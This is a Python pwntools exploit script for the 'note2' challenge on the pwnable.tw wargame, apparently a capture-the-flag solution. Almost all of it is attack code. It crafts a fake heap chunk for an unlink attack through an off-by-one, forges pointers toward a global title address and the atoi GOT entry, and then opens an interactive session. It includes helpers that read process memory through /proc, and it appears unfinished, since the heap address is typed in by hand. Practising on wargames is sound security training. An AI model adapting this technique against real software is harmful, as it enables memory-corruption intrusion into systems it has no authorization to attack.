## file: exp for note2 ## date: 2018-04-26## author: raycpfrom pwn import *from ctypes import *DEBUG = 1if DEBUG:     #p1 = process('./note')     p=remote('127.0.0.1', 6666 )     #scontext.log_level = 'debug'     libc = ELF('/lib/x86_64-linux-gnu/libc-2.23.so')     #p = process(['./babystack.dms'], env={'LD_PRELOAD': os.path.join(os.getcwd(),'libc_64.so.6')})     #libc = ELF('libc_64.so.6')     else:     p = remote('chall.pwnable.tw', 10205, )     libc = ELF('libc_64.so.6')#context.log_level = 'debug'wordSz = 4hwordSz = 2bits = 32PIE = 0mypid=0def leak(address, size):   with open('/proc/%s/mem' % mypid) as mem:      mem.seek(address)      return mem.read(size)def findModuleBase(pid, mem):   name = os.readlink('/proc/%s/exe' % pid)   with open('/proc/%s/maps' % pid) as maps:      for line in maps:         if name in line:            addr = int(line.split('-')[0], 16)            mem.seek(addr)            if mem.read(4) == "\x7fELF":               bitFormat = u8(leak(addr + 4, 1))               if bitFormat == 2:                  global wordSz                  global hwordSz                  global bits                  wordSz = 8                  hwordSz = 4                  bits = 64               return addr   log.failure("Module's base address not found.")   sys.exit(1)def debug(addr):    global mypid    mypid = proc.pidof(p)[0]    #raw_input('debug:')    with open('/proc/%s/mem' % mypid) as mem:        moduleBase = findModuleBase(mypid, mem)        gdb.attach(p, "set follow-fork-mode parent\nb *" + hex(moduleBase+addr))def change_title(data):    p.recvuntil('n--->>')    p.sendline('1')    p.recvuntil('title:')    p.send(data)def change_content(size,data):    p.recvuntil('n--->>')    p.sendline('2')    p.recvuntil('(64-256):')    p.sendline(str(size))    p.recvuntil('content:')    p.send(data)def change_comment(data):    p.recvuntil('n--->>')    p.sendline('3')    p.recvuntil('comment:')    p.send(data)    def show_content():    p.recvuntil('n--->>')    p.sendline('4')    title_addr=0x602070atoi_got=0x0000000000601fd0revise_count=0x602050def pwn():    #gdb.attach(p,'b*0x40125c')    ## step 1 unlink attack    fake_chunk=p64(0)+p64(0x20)+p64(title_addr-0x18)+p64(title_addr-0x10)+p64(0x20)+p8(0x40)    ##p8(0x40) off-by-one    heap_addr=int(raw_input("heap_addr: "),16)  #0x00603000    change_title(fake_chunk)    stri='a'*0x30+p64(0x40)+p64(0x71)+p64(heap_addr+0x2670-0x18)+p64(heap_addr+0x2670-0x10)    fake_comment=p64(heap_addr+0x16a0)+'A'*0x28+p64(0x1000)+p64(0x40)    change_content(0x78,stri+'\n')    change_comment(fake_comment+'\n')        change_content(0x90,stri+'\n')    change_content(0x100,stri+'\n')    p.interactive()if __name__ == '__main__':   pwn()     